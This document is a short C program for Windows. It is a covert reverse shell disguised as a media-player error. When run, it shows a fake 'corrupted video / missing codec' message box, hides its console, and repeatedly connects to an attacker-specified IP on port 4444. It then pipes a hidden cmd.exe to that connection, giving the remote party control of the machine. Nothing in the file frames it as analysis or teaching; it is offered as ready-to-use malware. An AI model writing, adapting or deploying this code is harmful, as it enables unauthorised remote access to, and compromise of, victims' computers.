#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

void connect_shell() {
    WSADATA wsa;
    SOCKET socket;
    struct sockaddr_in address;
    char *ip = "YOUR IP";
    int port = "4444";

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    while(1) {
        socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        inet_pton(AF_INET, ip, &address.sin_addr);
        if (WSAConnect(socket, (SOCKADDR*)&address, sizeof(address), NULL, NULL, NULL, NULL) == 0) {
            STARTUPINFO startup_info = {0};
            PROCESS_INFORMATION process_info = {0};
            startup_info.cb = sizeof(startup_info);
            startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)socket;
            startup_info.wShowWindow = SW_HIDE;

            CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
            WaitForSingleObject(process_info.hProcess, INFINITE);
        }
        closesocket(socket);
        Sleep(5000);
    }
}

int main() {
    MessageBox(NULL, "Error: The video file is corrupted or required codec (0xC004F011) is missing.", "Media Player Error", MB_ICONERROR | MB_OK);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    connect_shell();
    return 0;
}